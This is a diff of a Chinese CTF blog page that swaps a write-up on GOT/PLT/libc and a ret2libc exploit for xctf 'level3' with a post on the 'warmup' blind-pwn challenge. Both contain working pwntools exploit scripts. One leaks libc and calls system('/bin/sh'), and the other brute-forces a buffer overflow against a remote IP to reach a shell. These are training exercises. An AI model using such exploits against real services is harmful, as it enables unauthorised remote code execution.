@@ -4,9 +4,14 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="浅析got，plt，libc, Matrix">
-    <meta name="description" content="见详解：https://blog.csdn.net/weixin_41185953/article/details/104224260
-在引用一个函数时（如call printf）先会条到该函数的plt表：@plt。然后plt表上存有对应该">
+    <meta name="keywords" content="xctf进阶-pwn-warmup, Matrix">
+    <meta name="description" content="这个提没有附件，被称为盲打，blind pwn
+黑箱测试之类的。
+linux连接尝试：
+因为没有关键提示，可以从溢出方面下手，这个地址很可能就是后门。
+exp爆破：
+from pwn import *
+#context.log_level ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +19,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>浅析got，plt，libc | Matrix</title>
+    <title>xctf进阶-pwn-warmup | Matrix</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -279,13 +284,13 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        浅析got，plt，libc
+                        xctf进阶-pwn-warmup
                     </div>
                 </div>
             </div>
@@ -392,21 +397,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-05-23
+                    2020-05-16
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1k
+                        246
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        4 分
+                        1 分
                     </div>
                     
                 
@@ -422,51 +427,40 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>见详解：<a href="https://blog.csdn.net/weixin_41185953/article/details/104224260" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/104224260</a></p>
-<p>在引用一个函数时（如call printf）先会条到该函数的plt表：@plt。然后plt表上存有对应该函数的got表地址，跳到got表上。这个表上面存放被引用函数的真实地址。<br>为了程序运行时的效率，还没有引用某个函数时程序不会连接启用包括此函数这样就使程序运行速度更快。</p>
-<p><img src="https://s1.ax1x.com/2020/05/23/Yj19c4.png" alt="picture1"></p>
-<p>libc文件里面包含大量函数包括system，read，write还有字符串/bin/sh ，libc在被程序引用时会分配到一个地址也就是libc的首地址，然后里面的函数或被程序引用。</p>
-<p>引用过程：<br>首先libc分配到一个地址，他里面的函数字符串什么的本来就有内部基于libc首地址的偏移量，这些偏移量都是可以用ELF指令解析libc文件再用搜寻指令查到。所以一旦libc被引用分配得首地址libc里面所包括的所有函数和字符串地址就都确定了。call函数时用上述的plt，got表跳转寻址，最后通过重定位got表得到真实函数地址。</p>
-<p>对应题目：xctf pwn level3<br>1:file</p>
-<p><img src="https://s1.ax1x.com/2020/05/23/Yj1m9O.png" alt="picture2"></p>
-<p>2:checksec</p>
-<p><img src="https://s1.ax1x.com/2020/05/23/Yj1VN6.png" alt="picture3"></p>
-<p>可以栈溢出，NX开启：rop绕过</p>
-<p>3：ida</p>
-<p><img src="https://s1.ax1x.com/2020/05/23/Yj1kH1.png" alt="picture4"></p>
-<p><img src="https://s1.ax1x.com/2020/05/23/Yj1EAx.png" alt="picture5"></p>
-<p>查看buf的栈空间发现可以溢出：溢出量140</p>
-<p>所以现在的思路就是：payload = “A”*140 + p32(system_addr) + p32(0) + p32(binsh_addr)<br>所以得有哦system函数和binsh字符串   注意此处system函数的构建：函数地址+返回地址+函数参数  很多情况都是在栈中这样构建函数</p>
-<p>4：ida查看函数与字符串</p>
-<p><img src="https://s1.ax1x.com/2020/05/23/Yj1FBR.png" alt="picture6"></p>
-<p>显然这个程序只调用了read和write函数，没有system和binsh。恰好libc里面这两个都有所以要想办法得到libc的基地址。</p>
-<p>这里write函数有三个参数：1，字符串（地址），显示的字节数</p>
-<p>如果我们溢出了read函数后跳到我们自己构建的write函数上，把中间的参数改为write的got地址那么显示出got表上存放write函数的真实<br>地址（plt存储got表地址，got表存放函数地址）。<br>如果我们得到了write函数的真实地址，然后可以轻松得到write函数在libc中的偏移量，最后算出libc的基地址：libc_addr = write_addr - write_offset<br>得到了libc的基地址那么我们就可以得到system和binsh的真实地址，然后再进行一次溢出攻击即可</p>
-<p>exp：<br>from pwn import*</p>
-<p>sh = remote(“124.126.19.106”,52825)</p>
-<p>#sh = process(“level3”)</p>
-<p>elf = ELF(“level3”)<br>libc = ELF(“libc_32.so.6”)</p>
-<p>write_plt = elf.symbols[‘write’]    #write函数的plt地址<br>write_got = elf.got[‘write’]  #write函数的got地址，该地址存放write真实地址<br>main_addr = 0x08048484 #main函数地址可以从ida直接看，也可以elf.symbols[‘main’]搜索</p>
-<p>#print write_plt<br>#print write_got<br>#print main_addr</p>
-<p>payload = “A”*140 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) #第一次攻击溢出后返回到write函数的plt地址，因为write函数早已调用可以用plt地址或got地址来再次调用。后面时返回地址，返回到主函数将再次执行vulnerable函数以备下一次攻击。p32（1）为write函数的第一个参数，接下来分别是第二个第三个参数。p32（write_got）将go地址发给write作为参数，write将读取该地址上的内容并以字符串输出，p32(4)输出4字节</p>
-<p>#p.recv()<br>sh.recv() </p>
-<p>sh.sendline(payload)</p>
-<p>write_addr = u32(sh.recv(4))  #sh.recv(4)是接受4个字节的输出，u32和p32功能相反</p>
-<p>#print write_addr</p>
-<p>libc_addr = write_addr - libc.symbols[‘write’] #减去了write的offset</p>
-<p>#print(hex(libc_addr))</p>
-<p>#print “libc”+hex(libc_addr)</p>
-<p>binsh_addr = libc_addr + libc.search(“/bin/sh”).next()  #得到binsh真实地址</p>
-<p>#print “binsh_addr =&gt; “+hex(binsh_addr)</p>
-<p>sys_addr = libc_addr + libc.symbols[‘system’]  #得到system真实地址</p>
-<p>print “sys_addr =&gt; “+hex(sys_addr)</p>
-<p>payload = “A”*140 + p32(sys_addr) + p32(0) + p32(binsh_addr)  #通过上次攻击返回地址位vulnerable函数可以再次攻击</p>
-<p>sh.recv()</p>
-<p>sh.sendline(payload)</p>
-<p>sh.interactive()</p>
-<p>注意在本地测试脚本时要找到本地level3引用的libc文件：指令ldd level3</p>
-<p><img src="https://s1.ax1x.com/2020/05/23/Yj1Z4K.png" alt="picture7"></p>
-<p>因为本地的libc文件和题目给的有点不一样，至少offset是不一样的。</p>
+                <p>这个提没有附件，被称为盲打，blind pwn<br><img src="https://s1.ax1x.com/2020/05/23/YjvFy9.png" alt=""></p>
+<p>黑箱测试之类的。</p>
+<p>linux连接尝试：<br><img src="https://s1.ax1x.com/2020/05/23/YjviQJ.png" alt=""></p>
+<p>因为没有关键提示，可以从溢出方面下手，这个地址很可能就是后门。</p>
+<p>exp爆破：</p>
+<pre><code>from pwn import *
+#context.log_level = &#39;debug&#39;
+addr = 0x40060d    #地址可能是p32 也可能是p64
+
+def fuzz(r, num, flag):    #爆破函数 , flag表示有3种可能：p32发送后门，p64发送后门，无效后门。
+    payload = &#39;a&#39; * num
+    if flag==1:
+        payload += p32(addr)
+    if flag==2:
+        payload += p64(addr)
+    r.recvuntil(&quot;&gt;&quot;)
+    r.sendline(payload)
+
+def main():
+    for i in range(1000):  
+        print(i)
+        for j in range(3):
+            try:
+                r = remote(&quot;101.200.240.241&quot;, 7000)
+                fuzz(r, i, j)
+                text = r.recv()
+                print(&#39;text.len=&#39;+str(len(text))+&#39;text=&#39;+text)
+                print(&#39;num=&#39;+str(i)+&#39; flag=&#39;+str(j))
+                r.interactive()
+            except:            #except为空则try语句中出现任何错误都会执行r.close()
+                r.close()
+
+if __name__ == &#39;__main__&#39;:
+    main()</code></pre><p>对于循环脚本可用ctr + c 打断无法继续下去的一个循环进行下一个循环</p>
 
             </div>
             <hr/>
@@ -607,7 +601,7 @@
                     </span>
                     <a href="http://squarepants0.github.io" class="b-link-green">Matrix</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2020/05/23/qian-xi-got-plt-libc/" class="b-link-green">浅析got，plt，libc</a>
+                    <a href="/2020/05/16/xctf-jin-jie-pwn-warmup/" class="b-link-green">xctf进阶-pwn-warmup</a>
                 </p>
             </div>
         </div>
@@ -632,50 +626,6 @@
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/05/23/mass/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="mass">
-                        
-                        <span class="card-title">mass</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary">             hexo基本写文章操作：1：在自己本地blog文件夹git bash here
-2:在bash中：hexo n “name” 或是直接在_posts中写文章
-3：文章中插入图片    语法：
-![图片alt](图片</div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-05-23
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-user fa-fw"></i>
-                            IT YUAN
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/mass/" target="_blank">
-                        <span class="chip bg-color">mass</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
                 <a href="/2020/05/22/formal/">
                     <div class="card-image">
                         
@@ -690,8 +640,49 @@
 
 对于这样的例子，在</div>
                     <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-05-22
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-user fa-fw"></i>
+                            IT YUAN
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn/" target="_blank">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/04/23/rop-x86/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="ROP_x86">
+                        
+                        <span class="card-title">ROP_x86</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。Control Flow Hijack 程序流劫持比较常</div>
+                    <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-05-22
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-04-23
                             </span>
                         <span class="publish-author">
                             
